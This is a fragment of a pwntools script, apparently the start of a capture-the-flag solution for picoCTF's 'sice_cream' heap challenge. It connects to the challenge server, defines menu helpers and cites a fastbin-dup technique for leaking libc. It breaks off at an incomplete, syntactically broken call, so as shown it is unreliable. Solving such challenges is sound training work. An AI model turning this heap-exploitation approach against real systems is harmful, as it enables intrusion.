from pwn import *
e=ELF('./sice_cream')
libc=ELF('./libc.so.6')
r = remote('jupiter.challenges.picoctf.org', 51860)
r.sendline(b'myname')
def buy(sz, contents):
	r.recvuntil(b'> ')
	r.sendline(b'1')
	r.recvuntil(b'> ')
	r.sendline(str(sz).encode())
	r.recvuntil(b'> ')
	r.sendline(contents)
def eat(i):
	r.recvuntil(b'> ')
	r.sendline(b'2')
	r.recvuntil(b'> ')
	r.sendline(str(i).encode())
# https://github.com/shellphish/how2heap/blob/master/glibc_2.23/fastbin_dup_into_stack.c
#leak libc 
buy(0x20, )
